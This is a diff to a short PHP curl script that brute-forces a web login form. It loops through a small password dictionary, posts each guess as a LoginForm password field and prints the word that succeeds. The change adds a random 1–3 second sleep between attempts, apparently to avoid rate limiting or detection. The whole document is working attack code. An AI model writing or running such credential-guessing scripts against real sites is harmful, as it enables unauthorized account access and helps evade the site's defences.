@@ -16,6 +16,12 @@ curl_setopt($z, CURLOPT_RETURNTRANSFER, true);
 
 $dict = ['test', 'abc', 'zzzz'];
 
+function randomSleep()
+{
+    $p = rand(1, 3);
+    sleep($p);
+}
+
 foreach ($dict as $word) {
     $data = 'LoginForm%5Bpassword%5D=' . $word;
     curl_setopt($z, CURLOPT_POSTFIELDS, $data);
@@ -26,6 +32,7 @@ foreach ($dict as $word) {
         echo $word . " - success\n";
         break;
     }
+    randomSleep();
 }
 
 curl_close($z);
